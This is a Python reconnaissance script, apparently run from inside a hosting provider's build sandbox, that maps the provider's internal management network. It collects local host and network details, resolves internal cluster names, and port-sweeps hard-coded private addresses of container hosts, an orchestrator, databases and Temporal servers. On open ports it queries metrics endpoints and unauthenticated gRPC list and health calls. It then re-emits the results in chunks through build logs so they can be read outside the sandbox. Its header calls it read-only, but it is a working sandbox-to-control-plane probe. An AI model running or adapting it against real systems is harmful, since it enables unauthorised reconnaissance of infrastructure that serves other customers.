#!/usr/bin/env python3
# i75972 probe: Metal builder RUN sandbox as vantage for railnet / node management plane.
# strictly read-only: TCP connect classification, HTTP GET, gRPC Health/GetSystemInfo (empty msgs),
# TLS handshake observation. No writes, no state changes.
import socket, ssl, struct, sys, os, json, time, subprocess, re

T_BASE = 2.0
SPACING = 0.30
OUT = []

def p(s=''):
    OUT.append(str(s))
    try:
        sys.stdout.write(str(s) + '\n'); sys.stdout.flush()
    except Exception:
        pass

def short(e):
    s = str(e)
    return s[:120]

# ---------------- local facts ----------------
def cmd(c, to=8):
    try:
        r = subprocess.run(['sh', '-c', c], capture_output=True, timeout=to)
        return (r.stdout.decode('utf-8', 'replace') + r.stderr.decode('utf-8', 'replace')).strip()
    except Exception as e:
        return 'ERR:' + short(e)

def local_facts():
    p('###LOCAL')
    p('dmi=%s serial=%s' % (cmd('cat /sys/class/dmi/id/product_name 2>/dev/null'), cmd('cat /sys/class/dmi/id/product_serial 2>/dev/null')))
    p('kernel=%s uid=%s' % (cmd('uname -r'), cmd('id -u')))
    p('addr=' + cmd('ip -br addr 2>/dev/null || ifconfig -a 2>/dev/null').replace('\n', ' | '))
    p('route=' + cmd('ip route 2>/dev/null').replace('\n', ' | '))
    p('route6=' + cmd('ip -6 route 2>/dev/null').replace('\n', ' | '))
    p('neigh=' + cmd('ip neigh 2>/dev/null').replace('\n', ' | ')[:800])
    p('resolv=' + cmd('cat /etc/resolv.conf 2>/dev/null').replace('\n', ' | '))
    p('hosts=' + cmd('cat /etc/hosts 2>/dev/null').replace('\n', ' | ')[:500])
    p('sysctl_icmp=' + cmd('sysctl net.ipv4.ping_group_range 2>/dev/null'))
    names = ['host.containers.internal', 'host.docker.internal',
             'production-stacker-gcp-asia-southeast1-c-n4-111.asia-southeast1-c.c.railway-infra.internal',
             'temporal-frontend.temporal-dataplane.svc.cluster.local',
             'api-server.network-cp.svc.cluster.local',
             'pg-bouncer.network-cp.svc.cluster.local']
    for n in names:
        r = cmd('getent hosts %s 2>/dev/null | head -2' % n, to=6)
        p('dns %s -> %s' % (n, r.replace('\n', ' | ') if r else 'NXDOMAIN/empty'))

# ---------------- TCP ----------------
def tcp_probe(host, port, to=T_BASE):
    t0 = time.time()
    s = None
    try:
        s = socket.create_connection((host, port), timeout=to)
        dt = round(time.time() - t0, 2)
        try:
            s.settimeout(0.8)
            data = s.recv(64)
            if data:
                return ('OPEN-banner', dt, data[:64].decode('latin1').replace('\r', '.').replace('\n', '.'))
            return ('OPEN', dt, 'no-banner')
        except socket.timeout:
            return ('OPEN', dt, 'recv-timeout')
        except ConnectionResetError:
            return ('OPEN-reset', dt, 'ECONNRESET')
        except Exception as e:
            return ('OPEN', dt, short(e))
    except ConnectionRefusedError:
        return ('REFUSED', round(time.time() - t0, 2), 'ECONNREFUSED')
    except socket.timeout:
        return ('TIMEOUT', round(time.time() - t0, 2), 'timeout')
    except OSError as e:
        return ('UNREACH', round(time.time() - t0, 2), short(e))
    finally:
        try:
            if s: s.close()
        except Exception:
            pass

# ---------------- HTTP/1.1 ----------------
def http1(host, port, path, hosthdr=None, to=3.0):
    try:
        s = socket.create_connection((host, port), timeout=to)
        s.settimeout(to)
        req = 'GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: railprobe/1\r\nAccept: */*\r\nConnection: close\r\n\r\n' % (
            path, hosthdr or ('%s:%d' % (host, port)))
        s.sendall(req.encode())
        buf = b''
        t0 = time.time()
        while len(buf) < 4096 and time.time() - t0 < to:
            try:
                d = s.recv(4096)
            except socket.timeout:
                break
            if not d: break
            buf += d
            if b'\r\n\r\n' in buf and len(buf) > 200: break
        s.close()
        if not buf:
            return 'NO-DATA'
        head, _, body = buf.partition(b'\r\n\r\n')
        h = head.decode('latin1').replace('\r\n', ' ; ')[:300]
        b = body[:220].decode('utf-8', 'replace').replace('\n', '\\n').replace('\r', '')
        return 'head=[%s] body=%r' % (h, b)
    except Exception as e:
        return 'FAIL ' + short(e)

# ---------------- TLS ----------------
def tls_probe(host, port, sni=None, to=3.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        raw = socket.create_connection((host, port), timeout=to)
        raw.settimeout(to)
        ss = ctx.wrap_socket(raw, server_hostname=sni or host)
        cert = ss.getpeercert(binary_form=True)
        info = 'TLS-OK %s %s' % (ss.version(), ss.cipher()[0] if ss.cipher() else '')
        if cert:
            try:
                import ssl as _s
                # subject/issuer via openssl-less: use _ssl._test_decode_cert needs file; just fingerprint
                info += ' certlen=%d sha256=%s' % (len(cert), __import__('hashlib').sha256(cert).hexdigest()[:16])
            except Exception:
                pass
        # try one read to surface certificate_required alerts
        try:
            ss.settimeout(1.0)
            ss.recv(16)
        except ssl.SSLError as e:
            info += ' read-sslerr=' + short(e)
        except Exception:
            pass
        ss.close()
        return info
    except ssl.SSLError as e:
        return 'TLS-FAIL ' + short(e)
    except Exception as e:
        return 'TLS-FAIL ' + short(e)

# ---------------- h2 / gRPC ----------------
def h2_grpc(host, port, path, body=b'', to=4.0, use_tls=False, sni=None):
    try:
        from h2.connection import H2Connection
        from h2.config import H2Configuration
        from h2.events import ResponseReceived, DataReceived, TrailersReceived, StreamEnded
    except Exception as e:
        return 'NO-H2LIB ' + short(e)
    raw = None
    try:
        raw = socket.create_connection((host, port), timeout=to)
        raw.settimeout(to)
        if use_tls:
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw, server_hostname=sni or host)
            raw.settimeout(to)
        c = H2Connection(config=H2Configuration(client_side=True, header_encoding='utf-8'))
        c.initiate_connection()
        raw.sendall(c.data_to_send())
        hdrs = [(':method', 'POST'), (':scheme', 'https' if use_tls else 'http'),
                (':authority', '%s:%d' % (host, port)), (':path', path),
                ('content-type', 'application/grpc'), ('te', 'trailers'),
                ('user-agent', 'grpc-go/1.60.0')]
        c.send_headers(1, hdrs, end_stream=(len(body) == 0))
        if body:
            c.send_data(1, body, end_stream=True)
        raw.sendall(c.data_to_send())
        got = {'headers': None, 'trailers': None, 'data': b'', 'end': False}
        t0 = time.time()
        while time.time() - t0 < to and not got['end']:
            try:
                d = raw.recv(65535)
            except socket.timeout:
                break
            if not d:
                break
            evs = c.receive_data(d)
            for ev in evs:
                if isinstance(ev, ResponseReceived):
                    got['headers'] = dict(ev.headers)
                elif isinstance(ev, DataReceived):
                    got['data'] += ev.data
                    c.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                elif isinstance(ev, TrailersReceived):
                    got['trailers'] = dict(ev.headers)
                elif isinstance(ev, StreamEnded):
                    got['end'] = True
            try:
                raw.sendall(c.data_to_send())
            except Exception:
                pass
        st = (got['trailers'] or {}).get('grpc-status')
        msg = (got['trailers'] or {}).get('grpc-message', '')
        h = got['headers'] or {}
        return 'H2 hdrs=%s grpc-status=%s grpc-message=%r datalen=%d data=%s' % (
            json.dumps({k: (v[:100] if isinstance(v, str) else v) for k, v in h.items()})[:300],
            st, msg[:120], len(got['data']), got['data'][:80].hex())
    except Exception as e:
        return 'H2-FAIL ' + short(e)
    finally:
        try:
            if raw: raw.close()
        except Exception:
            pass

def grpc_msg(payload=b''):
    return struct.pack('>BI', 0, len(payload)) + payload

# ---------------- target list ----------------
# (tag, ip, [ports], role)
TARGETS = [
    ('metal-railnet-65-166', '10.65.64.166', [8081, 50052, 50152, 8773, 8774, 22, 7411], 'metal-stacker'),
    ('metal-railnet-65-27',  '10.65.64.27',  [8081, 50052, 50152, 8773, 8774, 22, 7411], 'metal-stacker'),
    ('metal-railnet-67-90',  '10.67.0.90',   [8081, 50052, 50152, 8773, 8774, 22, 7411], 'metal-stacker'),
    ('metal-railnet-67-154', '10.67.0.154',  [8081, 50052, 50152, 8773, 8774, 22, 7411], 'metal-stacker'),
    ('gcp-n4-73',  '10.131.0.157', [50052, 50152, 8081, 22], 'gcp-stacker'),
    ('gcp-n4-111', '10.131.0.197', [50052, 50152, 8081, 22], 'gcp-stacker'),
    ('gcp-n4-46',  '10.131.0.90',  [50052, 50152, 8081, 22], 'gcp-stacker'),
    ('gcp-160',    '10.131.0.160', [50052, 50152, 8081, 22], 'gcp-stacker'),
    ('gcp-166',    '10.131.0.166', [50052, 50152, 8081, 22], 'gcp-stacker'),
    ('gcp-164',    '10.131.0.164', [50052, 50152, 8081, 22], 'gcp-stacker'),
    ('api-server',   '10.10.10.40',  [8442], 'network-cp'),
    ('orchestrator', '10.10.10.42',  [8775, 8776], 'orchestrator'),
    ('vminsert',     '10.10.10.58',  [8480], 'vm'),
    ('storage-cp',   '10.10.10.166', [8777], 'storage'),
    ('vmselect',     '10.10.10.198', [8481], 'vm'),
    ('clickhouse',   '10.10.10.199', [8123], 'monitoring'),
    ('pg-core',      '10.171.0.5',   [5432], 'db'),
    ('temporal-1',   '10.20.130.15', [7235], 'temporal'),
    ('temporal-2',   '10.20.25.140', [7235], 'temporal'),
    ('temporal-3',   '10.20.78.142', [7235], 'temporal'),
]

CONTROLS = [
    ('posctl-1.1.1.1', '1.1.1.1', 443),
    ('posctl-gw', '35.247.70.7', 443),
    ('negctl', '192.0.2.123', 9),
]

def read_stage(tag, ip, port):
    out = []
    if port == 8081:
        for path in ['/healthcheck', '/metrics/volumes', '/metrics/containers']:
            out.append('%s -> %s' % (path, http1(ip, port, path)))
    elif port in (8773, 8774):
        for path in ['/metrics', '/health']:
            out.append('%s -> %s' % (path, http1(ip, port, path)[:400]))
    elif port == 8776:
        for path in ['/health', '/api/v1/stackers']:
            out.append('%s -> %s' % (path, http1(ip, port, path)[:500]))
    elif port == 8123:
        out.append('/?query=SELECT 1 -> %s' % http1(ip, port, '/?query=SELECT%201')[:400])
    elif port == 50052:
        out.append('grpc /stacker.Stacker/Health -> %s' % h2_grpc(ip, port, '/stacker.Stacker/Health', grpc_msg()))
        out.append('grpc /stacker.Stacker/List -> %s' % h2_grpc(ip, port, '/stacker.Stacker/List', grpc_msg()))
    elif port == 50152:
        t = tls_probe(ip, port)
        out.append('tls -> %s' % t)
        if t.startswith('TLS-OK'):
            out.append('grpc /stacker.Stacker/Health(tls) -> %s' % h2_grpc(ip, port, '/stacker.Stacker/Health', grpc_msg(), use_tls=True))
    elif port == 8775:
        out.append('grpc /orchestrator.OrchestrationService/Health -> %s' % h2_grpc(ip, port, '/orchestrator.OrchestrationService/Health', grpc_msg()))
        out.append('grpc /orchestrator.OrchestrationService/ListStackerHealth -> %s' % h2_grpc(ip, port, '/orchestrator.OrchestrationService/ListStackerHealth', grpc_msg()))
    elif port == 8442:
        out.append('grpc /health -> %s' % h2_grpc(ip, port, '/grpc.health.v1.Health/Check', grpc_msg()))
    elif port == 7235:
        out.append('grpc /temporal.../GetSystemInfo -> %s' % h2_grpc(ip, port, '/temporal.api.workflowservice.v1.WorkflowService/GetSystemInfo', grpc_msg()))
    elif port == 7411:
        out.append('tls -> %s' % tls_probe(ip, port))
    elif port == 22:
        pass
    return out

def main():
    p('===I75972-RPT-START===')
    local_facts()
    p('###SWEEP')
    conns = 0
    opens = []
    for tag, host, ports, role in TARGETS:
        for port in ports:
            if conns >= 66:
                break
            cls, dt, extra = tcp_probe(host, port)
            conns += 1
            p('TCP %s %s:%d [%s] %s %ss %s' % (role, host, port, tag, cls, dt, extra))
            if cls.startswith('OPEN'):
                opens.append((tag, host, port, cls))
            time.sleep(SPACING)
    p('###CONTROLS')
    for tag, host, port in CONTROLS:
        cls, dt, extra = tcp_probe(host, port)
        conns += 1
        p('TCP %s %s:%d %s %ss %s' % (tag, host, port, cls, dt, extra))
        time.sleep(SPACING)
    p('###READS open=%d' % len(opens))
    reads = 0
    for tag, host, port, cls in opens:
        if reads >= 30:
            break
        for line in read_stage(tag, host, port):
            reads += 1
            p('RD %s %s:%d %s' % (tag, host, port, line[:600]))
            time.sleep(SPACING)
    p('###STATS conns=%d opens=%d reads=%d' % (conns, len(opens), reads))
    p('===I75972-RPT-END===')
    try:
        open('/out/report.txt', 'w').write('\n'.join(OUT))
    except Exception:
        pass
    # chunked re-emit to survive per-line limits in log collection
    txt = '\n'.join(OUT)
    p('===CHUNKED-BEGIN===')
    for i in range(0, len(txt), 600):
        p('CHUNK %04d %s' % (i // 600, txt[i:i + 600]))
    p('===CHUNKED-END===')

if __name__ == '__main__':
    main()
